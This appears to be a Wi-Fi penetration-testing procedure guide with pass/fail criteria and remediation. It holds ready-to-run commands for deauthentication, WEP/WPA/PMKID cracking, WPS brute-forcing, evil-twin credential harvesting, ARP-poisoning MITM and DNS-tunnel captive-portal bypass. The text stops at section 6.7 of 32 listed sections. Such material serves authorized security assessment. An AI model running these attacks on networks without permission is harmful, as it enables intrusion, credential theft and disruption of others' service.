# Wireless (Wi-Fi) Penetration Testing — Full Procedures

> **Source of Truth:** Wireless (WiFi) Penetration Testing\_Checklist v1.0.xlsx  
> **Scope:** Every checklist item is covered in this document.  
> **Target Platforms:** macOS (with compatible USB Wi-Fi adapter) & Kali Linux  
> **Legal Warning:** All testing must be performed only on networks you are explicitly authorized to test. Unauthorized wireless testing is a criminal offence.

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Wi-Fi Security Protocol Assessment — Personal/PSK Networks](#2-wi-fi-security-protocol-assessment--personalpsk-networks)
3. [Identify Wireless Networks](#3-identify-wireless-networks)
4. [Cracking](#4-cracking)
5. [Vulnerability Research](#5-vulnerability-research)
6. [Exploitation](#6-exploitation)
7. [DoS Testing](#7-dos-testing)
8. [Network Protocol Testing](#8-network-protocol-testing)
9. [WEP Assessment](#9-wep-assessment)
10. [WPA/WPA2 Assessment](#10-wpawpa2-assessment)
11. [LEAP Encrypted WLAN](#11-leap-encrypted-wlan)
12. [Unencrypted WLAN](#12-unencrypted-wlan)
13. [WPS Assessment](#13-wps-assessment)
14. [Authentication Testing](#14-authentication-testing)
15. [Network Enumeration After Authentication](#15-network-enumeration-after-authentication)
16. [VLAN & Segmentation Testing — Guest WLAN](#16-vlan--segmentation-testing--guest-wlan)
17. [Wireless Management-Plane Security](#17-wireless-management-plane-security)
18. [Evil-Twin / Impersonation Resilience](#18-evil-twin--impersonation-resilience)
19. [Common Wireless Findings to Check Explicitly](#19-common-wireless-findings-to-check-explicitly)
20. [KARMA Attack](#20-karma-attack)
21. [Loud-Mouth / Preferred Network List (PNL)](#21-loud-mouth--preferred-network-list-pnl)
22. [802.1X Certificate Validation](#22-8021x-certificate-validation)
23. [Captive Portal Logic Review](#23-captive-portal-logic-review)
24. [Guest-to-Corporate Segmentation](#24-guest-to-corporate-segmentation)
25. [IoT Network Pivot Assessment](#25-iot-network-pivot-assessment)
26. [LLMNR / NBNS Exposure](#26-llmnr--nbns-exposure)
27. [DNS Policy Bypass](#27-dns-policy-bypass)
28. [RF Coverage Assessment](#28-rf-coverage-assessment)
29. [Certificate Lifecycle Review (EAP-TLS)](#29-certificate-lifecycle-review-eap-tls)
30. [Guest Session Persistence](#30-guest-session-persistence)
31. [KoreK ChopChop Attack](#31-korek-chopchop-attack)
32. [Packet Injection](#32-packet-injection)

---

## Prerequisite Setup

### Enable Monitor Mode (All Platforms)

```bash
# Kali Linux
sudo airmon-ng check kill
sudo airmon-ng start wlan0
# Adapter is now: wlan0mon

# macOS (using compatible USB adapter, e.g., ALFA AWUS036ACH)
# Install aircrack-ng suite via Homebrew
brew install aircrack-ng
sudo airmon-ng start wlan0
```

---

## 1. Reconnaissance

### 1.1 Discover the Devices

**Objective:** Identify all wireless devices (APs and clients) visible from the testing position.

**Step-by-Step Procedure:**
1. Put the wireless adapter into monitor mode.
2. Launch passive scan across all channels.
3. Note all BSSIDs, SSIDs, channels, signal strengths, and connected clients.
4. Save output to files for later comparison.

**Commands:**

```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
sudo kismet -c wlan0mon
sudo airodump-ng wlan0mon --write recon_output --output-format csv,pcap
```

**What to Look For:**
- All BSSIDs and corresponding SSIDs
- Channel assignments and signal levels (PWR column)
- Encryption type (ENC/CIPHER columns: OPN, WEP, WPA, WPA2, WPA3)
- Authentication method (AUTH column)
- Associated client MAC addresses

**Pass Criteria:** All discovered devices are documented; only expected/authorized APs appear.  
**Fail Criteria:** Unknown or rogue BSSIDs discovered; unauthorized devices present.

**Evidence to Capture:**
- `airodump-ng` CSV output screenshot
- Wireshark PCAP of beacon frames
- Kismet session log

**Remediation:** Maintain an authorized AP inventory; deploy WIDS/WIPS to alert on unknown BSSIDs.

---

### 1.2 Identify Hidden Access Points

**Objective:** Discover SSIDs that are not broadcasting their network name.

**Step-by-Step Procedure:**
1. Run passive scan and note BSSIDs with blank `ESSID` field (hidden networks).
2. Wait for client probe-request frames or perform active deauthentication to force clients to reveal the SSID.
3. Capture the reassociation probe response that reveals the SSID.

**Commands:**

```bash
sudo airodump-ng wlan0mon
sudo aireplay-ng --deauth 5 -a <BSSID_of_hidden_AP> wlan0mon
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 5" -T fields -e wlan.ssid
```

**What to Look For:**
- `ESSID` column showing `<length: X>` instead of a name
- Probe-response packets disclosing the actual SSID

**Pass Criteria:** Hidden SSID cannot be practically revealed without client activity; WIDS alerts on probe flooding.  
**Fail Criteria:** SSID is trivially recovered.

**Evidence to Capture:** Wireshark screenshot showing probe response with plaintext SSID.

**Remediation:** Hiding SSID provides no real security; rely on strong authentication (WPA3-SAE or 802.1X). Deploy WIDS to detect probe flooding.

---

### 1.3 Identify the Encryption (WPA/WPA2/WPS etc.)

**Objective:** Enumerate the security protocol and cipher suite in use for every discovered SSID.

**Step-by-Step Procedure:**
1. Run `airodump-ng` and examine the `ENC` and `CIPHER` columns.
2. Capture beacon frames in Wireshark for detailed RSN/WPA IE inspection.
3. Use `wash` to identify WPS-enabled APs.

**Commands:**

```bash
sudo airodump-ng wlan0mon
# Columns: ENC = WEP/WPA/WPA2/WPA3 | CIPHER = TKIP/CCMP | AUTH = PSK/MGT/SAE

sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 8" \
  -T fields -e wlan.ssid -e wlan_rsna_ie.rsn.pcs.list -e wlan_rsna_ie.akms.list

sudo wash -i wlan0mon
# Output shows: BSSID | Ch | dBm | WPS | Lck | Vendor | ESSID
```

**What to Look For:**
- WEP: `ENC=WEP` — critically weak, RC4 cipher
- WPA-TKIP: legacy/weak
- WPA2-CCMP: acceptable minimum
- WPA3-SAE/OWE: modern/best
- WPS: `Lck=No` = vulnerable to Pixie Dust / PIN brute-force

**Pass Criteria:** WPA3-SAE or WPA2-CCMP (AES) with no WPS; TKIP and WEP absent.  
**Fail Criteria:** WEP, WPA-TKIP, open authentication, or WPS enabled.

**Evidence to Capture:**
- `airodump-ng` output screenshot annotated with encryption column
- `wash` output screenshot

**Remediation:** Migrate to WPA3-SAE; disable WPS; disable TKIP; disable WEP.

---

### 1.4 Sniff Packets — Unencrypted Networks

**Objective:** Capture and analyze traffic on open (unencrypted) wireless networks to confirm data exposure.

**Step-by-Step Procedure:**
1. Associate with or passively monitor the open network.
2. Capture traffic using `airodump-ng` or Wireshark.
3. Filter for sensitive protocol traffic (HTTP, FTP, SMTP, Telnet, DNS).
4. Identify cleartext credentials, session tokens, or PII.

**Commands:**

```bash
sudo airodump-ng --bssid <BSSID> -c <channel> -w open_capture wlan0mon
sudo wireshark -i wlan0mon -k

sudo tshark -i wlan0mon \
  -Y "http.authbasic or ftp.request.command == \"PASS\" or smtp.auth.password" \
  -T fields -e http.authbasic -e ftp.request.arg

sudo bettercap -iface wlan0
# bettercap> net.probe on
# bettercap> net.sniff on
```

**What to Look For:**
- Cleartext HTTP credentials (Authorization: Basic headers)
- FTP/SMTP/Telnet passwords
- Session cookies in plain HTTP
- DNS queries revealing internal hostnames

**Pass Criteria:** No sensitive data is transmitted unencrypted; network uses encryption.  
**Fail Criteria:** Cleartext credentials, session tokens, or PII captured.

**Evidence to Capture:**
- Wireshark screenshot of captured plaintext credentials (redact actual passwords in report)
- PCAP file as attachment

**Remediation:** Never deploy open (unencrypted) corporate wireless. Use WPA2/WPA3 with 802.1X. Enforce TLS on all applications.

---

### 1.5 Obtain Authorized SSID List

**Objective:** Acquire the client's documented list of authorized SSIDs and compare against what is observed over-the-air.

**Commands:**

```bash
sudo airodump-ng wlan0mon --write inventory_scan --output-format csv

python3 -c "
import csv
authorized = {row['SSID'] for row in csv.DictReader(open('authorized_ssids.csv'))}
observed = {row[' ESSID'].strip() for row in csv.DictReader(open('inventory_scan-01.csv'))}
print('ROGUE SSIDs:', observed - authorized)
print('OFFLINE APs:', authorized - observed)
"
```

**Pass Criteria:** All observed SSIDs match the authorized inventory.  
**Fail Criteria:** Unrecognized SSIDs present; rogue APs detected.

**Evidence:** Side-by-side comparison table of authorized vs. observed SSIDs.

**Remediation:** Maintain a live WLAN inventory; deploy WIDS to alert on unauthorized SSIDs.

---

### 1.6 Identify Corporate SSIDs

**Objective:** Enumerate SSIDs associated with corporate wireless infrastructure.

**Commands:**

```bash
sudo airodump-ng wlan0mon --write corporate_scan --output-format csv
sudo airodump-ng wlan0mon | grep -i "Cisco\|Aruba\|Meraki\|Ruckus"
macchanger --lookup <first_3_octets_of_BSSID>
```

**Pass Criteria:** Corporate SSIDs use WPA2/WPA3-Enterprise (802.1X); no TKIP; no WPS.  
**Fail Criteria:** Corporate SSIDs use WPA2-Personal or weaker.

**Evidence:** `airodump-ng` CSV export annotated with SSID purpose.

**Remediation:** Use 802.1X with a RADIUS server for all corporate SSIDs.

---

### 1.7 Identify Guest SSIDs

**Objective:** Confirm guest SSIDs are isolated and do not expose corporate resources.

**Commands:**

```bash
sudo airodump-ng wlan0mon
# Identify SSIDs containing "Guest", "Visitor", "Public" etc.
```

**Pass Criteria:** Guest SSIDs are segmented from corporate network; use captive portal or separate VLAN.  
**Fail Criteria:** Guest SSID on same subnet as corporate; no client isolation.

**Evidence:** Network diagram showing VLAN assignments; segmentation test results.

**Remediation:** Place guest SSID on a separate VLAN with firewall rules restricting access to internet only; enable AP client isolation.

---

### 1.8 Scan for 2.4 GHz Networks

**Objective:** Enumerate all Wi-Fi networks in the 2.4 GHz band.

**Commands:**

```bash
sudo airodump-ng --band bg wlan0mon
sudo airodump-ng --channel 1,2,3,4,5,6,7,8,9,10,11,12,13,14 wlan0mon
```

**Pass Criteria:** No unauthorized APs; encryption meets policy requirements.  
**Fail Criteria:** Rogue AP or WEP/open network discovered.

**Evidence:** `airodump-ng` output filtered to 2.4 GHz channels.

**Remediation:** Audit and disable 2.4 GHz radio if not required; update firmware on legacy APs.

---

### 1.9 Scan for 5 GHz Networks

**Objective:** Enumerate all Wi-Fi networks in the 5 GHz band.

**Commands:**

```bash
sudo airodump-ng --band a wlan0mon
sudo airodump-ng --channel 36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,149,153,157,161,165 wlan0mon
```

**Pass Criteria:** All 5 GHz APs are authorized; encryption is WPA2/WPA3.  
**Fail Criteria:** Unauthorized AP on 5 GHz; weaker encryption than policy requires.

**Evidence:** `airodump-ng` output filtered to 5 GHz channels.

**Remediation:** Apply same security policies to 5 GHz as 2.4 GHz; enable WIDS monitoring on 5 GHz.

---

### 1.10 Scan for 6 GHz Networks (Wi-Fi 6E / Wi-Fi 7)

**Objective:** Enumerate all Wi-Fi networks in the 6 GHz band.

**Commands:**

```bash
sudo airodump-ng --band e wlan0mon   # 6 GHz (newer aircrack-ng)
sudo kismet -c wlan0mon
sudo iw dev wlan0 scan | grep -E "SSID|freq|signal|BSS"
```

**Pass Criteria:** All 6 GHz SSIDs use WPA3-SAE; unauthorized SSIDs absent.  
**Fail Criteria:** Unauthorized AP; 6 GHz AP accepting WPA2 connections.

**Evidence:** Kismet or iw scan output showing 6 GHz SSIDs.

**Remediation:** Ensure WPA3-only policy on 6 GHz APs; apply same inventory controls.

---

### 1.11 Identify WPA Version

**Objective:** Determine the WPA version (WPA, WPA2, WPA3) in use on each SSID.

**Commands:**

```bash
sudo airodump-ng wlan0mon
# ENC column: WPA | WPA2 | WPA3

tshark -i wlan0mon -Y "wlan.fc.type_subtype == 8" \
  -T fields -e wlan.ssid -e wlan_rsna_ie.rsn.pcs.list -e wlan_rsna_ie.akms.list 2>/dev/null
```

**Pass Criteria:** WPA3 in use; WPA1 (TKIP only) absent.  
**Fail Criteria:** WPA (v1) or WEP in use.

**Evidence:** `airodump-ng` screenshot showing ENC column.

**Remediation:** Upgrade to WPA3-SAE. Minimum acceptable: WPA2-CCMP.

---

### 1.12 Identify WPA2 Usage

**Objective:** Confirm WPA2 networks are using CCMP (AES) and not TKIP.

**Commands:**

```bash
sudo airodump-ng wlan0mon
# CIPHER column must show CCMP not TKIP

tshark -i wlan0mon -Y "wlan.fc.type_subtype == 8 && wlan.tag.number == 48" \
  -T fields -e wlan.ssid -e wlan_rsna_ie.rsn.pcs.list
```

**Pass Criteria:** WPA2 networks use CCMP/AES only; TKIP disabled.  
**Fail Criteria:** TKIP in use with WPA2.

**Evidence:** `airodump-ng` or Wireshark screenshot showing CIPHER=CCMP.

**Remediation:** Disable TKIP in AP configuration; enforce CCMP-only cipher.

---

### 1.13 Identify WPA3 Usage

**Objective:** Verify WPA3 deployment and SAE/OWE configuration.

**Commands:**

```bash
sudo airodump-ng wlan0mon
# ENC column: WPA3 | AUTH column: SAE (personal) or OWE (enhanced open)

tshark -i wlan0mon -Y "wlan.fc.type_subtype == 8" \
  -T fields -e wlan.ssid -e wlan_rsna_ie.akms.list
# AKMS: 8 = SAE, 18 = OWE, 1 = PSK(WPA2)
```

**Pass Criteria:** WPA3-SAE or WPA3-Enterprise in use; pure WPA3 preferred over transition mode.  
**Fail Criteria:** WPA3 not deployed on any SSID.

**Evidence:** `airodump-ng` ENC/AUTH column screenshot.

**Remediation:** Plan WPA3-SAE rollout; use transition mode for legacy compatibility.

---

## 2. Wi-Fi Security Protocol Assessment — Personal/PSK Networks

### 2.1 Assess Password Policy

**Objective:** Evaluate the strength and policy of the Wi-Fi PSK.

**Step-by-Step Procedure:**
1. Attempt to capture the WPA handshake.
2. Run offline dictionary and rule-based attacks.
3. Review the password policy documentation.
4. Check for password length, complexity, and rotation schedule.

**Commands:**

```bash
sudo airodump-ng --bssid <BSSID> -c <channel> -w psk_audit wlan0mon
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon

# CPU crack
aircrack-ng -w /usr/share/wordlists/rockyou.txt psk_audit-01.cap

# GPU crack
hcxpcapngtool -o psk_audit.22000 psk_audit-01.cap
hashcat -m 22000 psk_audit.22000 rockyou.txt
hashcat -m 22000 psk_audit.22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**Pass Criteria:** PSK withstands attack with extensive wordlists; length >= 20 random characters.  
**Fail Criteria:** PSK cracked; password is a common word, company name, or address.

**Evidence to Capture:**
- `hashcat` output showing cracked password (redact in final report)
- Time-to-crack metric

**Remediation:** Enforce PSK >= 20 random characters; rotate quarterly; consider moving to 802.1X.

---

### 2.2 Determine Whether Passwords Are Reused Across SSIDs

**Objective:** Check if the same PSK is shared between corporate, guest, and IoT SSIDs.

**Commands:**

```bash
sudo airodump-ng --bssid <BSSID_corporate> -c <ch> -w corp_psk wlan0mon
sudo airodump-ng --bssid <BSSID_guest> -c <ch> -w guest_psk wlan0mon

aircrack-ng -w rockyou.txt corp_psk-01.cap
aircrack-ng -w rockyou.txt guest_psk-01.cap
# Compare results
```

**Pass Criteria:** Each SSID has a unique, strong PSK.  
**Fail Criteria:** Same password used on corporate and guest; or any two SSIDs share PSK.

**Evidence:** Documentation of identical cracked passwords across SSIDs.

**Remediation:** Assign unique, random PSKs per SSID; implement per-user PSK (PPSK).

---

### 2.3 Determine Whether Passwords Are Reused Between Wireless and Other Services

**Objective:** Check if the Wi-Fi PSK matches credentials used for other services (VPN, admin portal, domain).

**Commands:**

```bash
# After cracking PSK, test against admin portal
curl -s -o /dev/null -w "%{http_code}" -u admin:<cracked_psk> http://<router_ip>/

# Test against SSH
ssh -o PasswordAuthentication=yes admin@<AP_IP>

# Hydra against management interface
hydra -l admin -p <cracked_password> <AP_IP> http-get /
```

**Pass Criteria:** Wi-Fi PSK is not reused for any other service.  
**Fail Criteria:** PSK is the same as a domain, VPN, or admin password.

**Evidence:** Successful login with the wireless PSK against another service.

**Remediation:** Enforce password uniqueness; implement PAM; never reuse PSKs.

---

### 2.4 Determine Whether Guest and Corporate Networks Use Different Credentials

**Objective:** Verify separation of authentication credentials between guest and corporate WLANs.

**Commands:**

```bash
sudo airodump-ng --bssid <CORPORATE_BSSID> -c <ch> -w corp_cap wlan0mon
sudo aireplay-ng --deauth 5 -a <CORPORATE_BSSID> wlan0mon

aircrack-ng -w rockyou.txt guest_cap-01.cap
# Test guest PSK against corporate SSID
aircrack-ng -w <(echo "<guest_psk>") corp_cap-01.cap
```

**Pass Criteria:** Guest and corporate SSIDs use completely different credentials.  
**Fail Criteria:** Guest PSK authenticates to corporate SSID.

**Evidence:** `aircrack-ng` showing guest key does not match corporate handshake hash.

**Remediation:** Maintain completely separate credential sets; use 802.1X on corporate SSIDs.

---

### 2.5 Verify Credentials Are Not Exposed Through Management Interfaces

**Objective:** Ensure Wi-Fi PSKs are not stored or transmitted in cleartext through management portals.

**Commands:**

```bash
nmap -p 22,23,80,161,443,8080 <controller_ip> -sV
curl -v http://<AP_IP>/
curl -v http://<AP_IP>/status.json
snmpwalk -v2c -c public <AP_IP>
snmpwalk -v1 -c public <AP_IP>
```

**What to Look For:**
- PSK shown in cleartext in the web UI or API response
- HTTP (non-HTTPS) management page
- SNMP community string returning sensitive data

**Pass Criteria:** PSK is never exposed in UI, API, or SNMP; management uses HTTPS only.  
**Fail Criteria:** PSK visible in cleartext in any management interface.

**Evidence:** Screenshot of admin portal showing PSK in plaintext; Burp Suite intercept log.

**Remediation:** Ensure PSKs are masked/hashed in UI; disable HTTP management; restrict SNMP access.

---

## 3. Identify Wireless Networks

### 3.1 Setup the Wireless Card to Monitor Mode (airmon-ng)

**Objective:** Enable passive monitoring capability on the wireless adapter.

**Step-by-Step Procedure:**
1. Identify the wireless interface name.
2. Kill conflicting processes.
3. Enable monitor mode.
4. Verify monitor mode is active.

**Commands:**

```bash
# Step 1: Identify interface
ip link show
iwconfig

# Step 2: Kill conflicting processes
sudo airmon-ng check kill

# Step 3: Enable monitor mode
sudo airmon-ng start wlan0
# Result: wlan0mon

# Step 4: Verify
iwconfig wlan0mon
# Should show: Mode:Monitor

# macOS
sudo airmon-ng start wlan1   # USB adapter
```

**Pass Criteria:** Monitor mode successfully enabled without errors.  
**Fail Criteria:** Driver error; interface not entering monitor mode.

**Evidence:** `iwconfig` screenshot showing `Mode:Monitor`.

**Reference:** https://github.com/ivan-sincek/wifi-penetration-testing-cheat-sheet

---

### 3.2 Start Scanning Channels (airodump-ng)

**Objective:** Discover all Wi-Fi networks by hopping across all channels.

**Commands:**

```bash
sudo airodump-ng wlan0mon
sudo airodump-ng --band bg wlan0mon   # 2.4 GHz
sudo airodump-ng --band a wlan0mon    # 5 GHz
sudo airodump-ng wlan0mon --write scan_results --output-format csv,cap,kismet
sudo airodump-ng --bssid <BSSID> -c <channel> -w target_capture wlan0mon
```

**Pass Criteria:** Scan completed; all networks documented.  
**Fail Criteria:** Adapter not in monitor mode; no networks visible.

**Evidence:** Screenshot of `airodump-ng` output showing discovered networks.

**Reference:** https://purplesec.us/perform-wireless-penetration-test/

---

## 4. Cracking

### 4.1 Crack WEP

**Objective:** Demonstrate that WEP encryption can be broken in minutes using passive or active attacks.

**Step-by-Step Procedure:**
1. Enable monitor mode.
2. Lock to WEP target BSSID and channel.
3. Collect IVs (Initialization Vectors) — 50,000-100,000 minimum.
4. If no traffic, perform ARP replay attack to generate IVs.
5. Run `aircrack-ng` to derive the WEP key.

**Commands:**

```bash
sudo airmon-ng start wlan0
sudo airodump-ng --bssid <WEP_BSSID> -c <channel> -w wep_capture wlan0mon

# Fake authentication (if no clients)
sudo aireplay-ng -1 0 -a <WEP_BSSID> -h <your_MAC> wlan0mon

# ARP replay to generate IVs
sudo aireplay-ng -3 -b <WEP_BSSID> -h <your_MAC> wlan0mon

# Crack when #Data column > 50,000
aircrack-ng wep_capture-01.cap
aircrack-ng -n 128 wep_capture-01.cap
```

**What to Look For:** `KEY FOUND! [ xx:xx:xx:xx:xx ]` in aircrack-ng output; time < 5 minutes.

**Pass Criteria:** N/A — WEP is unconditionally FAIL.  
**Fail Criteria:** WEP key cracked (expected for any WEP network).

**Evidence to Capture:**
- `aircrack-ng` output showing `KEY FOUND!`
- Time elapsed to crack

**Remediation:** Immediately replace WEP with WPA3-SAE or minimum WPA2-CCMP. WEP is deprecated since 2004.

---

### 4.2 Crack WPA-PSK (WPS Pin, PMKID, Handshake)

**Objective:** Attempt to recover the WPA/WPA2 PSK via multiple attack vectors.

#### 4.2.1 WPA Handshake Capture + Cracking

```bash
sudo airodump-ng --bssid <BSSID> -c <channel> -w wpa_capture wlan0mon
sudo aireplay-ng --deauth 10 -a <BSSID> -c <client_MAC> wlan0mon

aircrack-ng wpa_capture-01.cap   # verify "1 handshake"
aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_capture-01.cap

hcxpcapngtool -o wpa.22000 wpa_capture-01.cap
hashcat -m 22000 wpa.22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 wpa.22000 /usr/share/wordlists/rockyou.txt -r best64.rule
```

#### 4.2.2 WPS PIN Brute-Force

```bash
sudo wash -i wlan0mon
sudo reaver -i wlan0mon -b <BSSID> -c <channel> -vv
sudo reaver -i wlan0mon -b <BSSID> -c <channel> -vv -K   # Pixie Dust
sudo bully -b <BSSID> -c <channel> wlan0mon -d
```

#### 4.2.3 PMKID Attack (Clientless WPA2/WPA3-Transition)

```bash
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --enable_status=1 \
  --filterlist_ap=<BSSID_no_colons>

hcxpcapngtool -o pmkid.22000 pmkid_capture.pcapng
hashcat -m 22000 pmkid.22000 rockyou.txt
hashcat -m 22000 pmkid.22000 rockyou.txt -r best64.rule
```

**Pass Criteria:** PSK withstands extensive wordlist + rule attacks; WPS disabled.  
**Fail Criteria:** PSK cracked; WPS PIN retrieved.

**Evidence:** `hashcat` cracking session output showing cracked key.

**Remediation:** Random PSK >= 20 characters; disable WPS; upgrade to WPA3-SAE; patch Pixie Dust-vulnerable firmware.

---

## 5. Vulnerability Research

### 5.1 4-Way Handshake Capture and Analysis

**Objective:** Capture and verify the EAPOL 4-way handshake to confirm WPA authentication is vulnerable to offline attack.

**Step-by-Step Procedure:**
1. Lock to target BSSID/channel.
2. Capture traffic and wait for a client to authenticate, or trigger deauthentication.
3. Verify the handshake is complete (all 4 EAPOL messages).
4. Confirm the capture can be used for offline cracking.

**Commands:**

```bash
sudo airodump-ng --bssid <BSSID> -c <channel> -w handshake_cap wlan0mon
sudo aireplay-ng --deauth 5 -a <BSSID> -c <client_MAC> wlan0mon

# Verify in Wireshark (filter: eapol)
# Look for: Message 1/4, 2/4, 3/4, 4/4

aircrack-ng handshake_cap-01.cap
tshark -i wlan0mon -Y "eapol" -T fields -e frame.number -e eapol.keydes.key_info
```

**What to Look For:**
- 4 EAPOL frames completing the handshake sequence
- `airodump-ng` shows `WPA handshake: <BSSID>` in top-right corner

**Pass Criteria (security view):** Handshake captured = high risk; remediate with WPA3-SAE.  
**Fail Criteria:** Handshake captured easily with no WIDS detection.

**Evidence:** Wireshark screenshot showing 4 EAPOL frames.

**Reference:** https://www.isoeh.com/tutorial-details-12-handy-wireless-penetration-testing-tools-for-linux.html

**Remediation:** WPA3-SAE eliminates offline handshake attacks via Dragonfly key exchange.

---

### 5.2 Rogue Access Points / Evil Twin Attacks

**Objective:** Assess the risk of clients connecting to rogue APs impersonating legitimate SSIDs.

> WARNING: AUTHORIZATION REQUIRED — Only perform if explicitly authorized in Rules of Engagement.

**Attack Variants:**
1. **Open Evil Twin** — captures captive portal credentials / enables LAN attacks
2. **WPA-PSK Evil Twin** — connects clients who know the PSK
3. **WPA-MGT (Enterprise) Evil Twin** — captures corporate domain credentials

**Commands:**

```bash
# Open Evil Twin
sudo airbase-ng -e "<TARGET_SSID>" -c <channel> wlan0mon

# Karma/MANA (responds to any probe request)
sudo hostapd-mana mana.conf

# WPA-MGT Evil Twin with credential harvesting
sudo hostapd-wpe hostapd-wpe.conf

# Crack MSCHAPv2
asleap -C <challenge_hex> -R <response_hex> -W /usr/share/wordlists/rockyou.txt
hashcat -m 5500 mschapv2_hashes.txt rockyou.txt
```

**Pass Criteria:** No clients associate with rogue AP; WIDS/WIPS detects and blocks.  
**Fail Criteria:** Clients connect; credentials harvested; no WIDS alert triggered.

**Evidence:** hostapd-mana/wpe log showing captured credentials; Wireshark capture.

**Remediation:** Deploy 802.1X with certificate validation; WIDS/WIPS rogue-AP detection; WPA3-SAE.

---

## 6. Exploitation

### 6.1 De-authenticating a Legitimate Client

**Objective:** Force a client off the network to capture the handshake when it reconnects.

**Commands:**

```bash
# Broadcast deauth (all clients)
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon

# Targeted deauth
sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon
```

**Pass Criteria:** 802.11w (MFP) enabled — deauth frames rejected; WIDS alerts; WPA3 in use.  
**Fail Criteria:** Clients disconnected; no WIDS alert; no MFP protection.

**Evidence:** `airodump-ng` screenshot showing handshake capture notification.

**Reference:** https://lesperance.io/bypassing-wep-shared-key-authentication/

**Remediation:** Enable IEEE 802.11w (Management Frame Protection); upgrade to WPA3.

---

### 6.2 Capturing the Initial Handshake

**Objective:** Passively capture a WPA handshake when a client naturally authenticates.

**Commands:**

```bash
sudo airodump-ng --bssid <BSSID> -c <channel> -w passive_capture wlan0mon
# Monitor top-right corner for: WPA handshake: XX:XX:XX:XX:XX:XX

tshark -r passive_capture-01.cap -Y "eapol" -T fields -e frame.time -e eapol.keydes.key_info
aircrack-ng passive_capture-01.cap
```

**Evidence:** `airodump-ng` screenshot with handshake annotation.

**Remediation:** Upgrade to WPA3-SAE; enable MFP.

---

### 6.3 Perform aircrack-ng Steps

**Objective:** Execute the complete aircrack-ng workflow from monitor mode to key recovery.

**Commands:**

```bash
# Complete workflow:
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
sudo airodump-ng --bssid <BSSID> -c <channel> -w crack_session wlan0mon
# (separate terminal)
sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon
aircrack-ng -w /usr/share/wordlists/rockyou.txt crack_session-01.cap

# PMKID alternative
hcxdumptool -i wlan0mon -o crack_session.pcapng --enable_status=1
hcxpcapngtool -o crack_session.22000 crack_session.pcapng
hashcat -m 22000 crack_session.22000 rockyou.txt
```

**Evidence:** Full terminal output from each step.

---

### 6.4 Captive Portals (MAC Spoofing, DNS Tunneling)

**Objective:** Test whether captive portal enforcement can be bypassed.

#### 6.4.1 MAC Spoofing Bypass

```bash
sudo airodump-ng --bssid <BSSID> -c <channel> wlan0mon
# Note an authenticated client MAC from STATION list

# Linux: spoof MAC
sudo ip link set wlan0 down
sudo macchanger -m <AUTHORIZED_CLIENT_MAC> wlan0
sudo ip link set wlan0 up

# macOS
sudo ifconfig en0 ether <AUTHORIZED_CLIENT_MAC>
```

#### 6.4.2 DNS Tunneling Bypass

```bash
sudo apt install iodine

# Server-side (your controlled server)
sudo iodined -f -c -P <password> 10.0.0.1 tunnel.<your_domain>

# Client-side (from captive portal network)
sudo iodine -f -P <password> <your_server_IP> tunnel.<your_domain>

ping -c 3 10.0.0.1
```

**Pass Criteria:** MAC spoofing fails; DNS tunneling blocked.  
**Fail Criteria:** Captive portal bypassed via MAC clone or DNS tunnel.

**Evidence:** Screenshot showing internet access achieved without portal login.

**Remediation:** Use 802.1X; strict DNS filtering; NAC enforces device posture.

---

### 6.5 MITM (Ettercap, bettercap, Wireshark)

**Objective:** Position attacker between clients and gateway to intercept/modify traffic.

> WARNING: AUTHORIZATION REQUIRED. Active MITM may disrupt production traffic.

**Commands:**

```bash
# ARP poisoning with Ettercap
sudo ettercap -T -M arp:remote /<GATEWAY_IP>/ /<TARGET_IP>/

# ARP poisoning with bettercap
sudo bettercap -iface wlan0
# bettercap> net.probe on
# bettercap> set arp.spoof.targets <TARGET_IP>
# bettercap> arp.spoof on
# bettercap> net.sniff on

# Wireshark capture
sudo wireshark -i wlan0
# Filter: http.request or ftp or telnet
```

**Pass Criteria:** HSTS prevents SSL strip; MITM detected by IDS.  
**Fail Criteria:** Credentials captured post-MITM.

**Evidence:** Wireshark screenshot of intercepted cleartext data (redact credentials).

**Remediation:** Enforce HSTS; use VPN on wireless; deploy intrusion detection.

---

### 6.6 PMKID Attack (WPA/WPA2)

**Objective:** Capture the PMKID from the AP without requiring any client to be connected.

**Commands:**

```bash
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --enable_status=1 \
  --filterlist_ap=<BSSID_WITHOUT_COLONS>

hcxpcapngtool -o pmkid_hashes.22000 pmkid_capture.pcapng
cat pmkid_hashes.22000   # Verify PMKID captured

hashcat -m 22000 pmkid_hashes.22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 pmkid_hashes.22000 /usr/share/wordlists/rockyou.txt -r best64.rule
```

**Pass Criteria:** PMKID attack fails (strong PSK resistant to wordlists).  
**Fail Criteria:** PSK cracked via PMKID.

**Evidence:** `hashcat` cracking session output.

**Remediation:** Random PSK >= 20 characters; upgrade to WPA3-SAE (no PMKID vulnerability).

---

### 6.7 Dictionary Attack on the Captured Key

**Objective:** Perform offline password cracking against a captured WPA handshake or PMKID.

**Commands:**

```bash
# CPU attack
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# GPU attack (recommended)
hashcat -m 22000 hashes.22000 rockyou.txt
hashcat -m 22000 hashes.22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 22000 hashes.22000 rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule

# Brute force (up to 8 chars)
hashcat -m 22000 hashes.22000 -a 3 ?a?a?a?a?a?a?a?a

# Custom wordlist with crunch
crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o custom_wordlist.txt
aircrack-ng -w custom_wordlist.txt capture-01.cap
```

**Pass Criteria:** PSK not in any common wordlist; rules-based attack fails.  
**Fail Criteria:** Password cracked within reasonable time/effort.

**Evidence:** hashcat/aircrack-ng output with cracked password (redacted in report body).
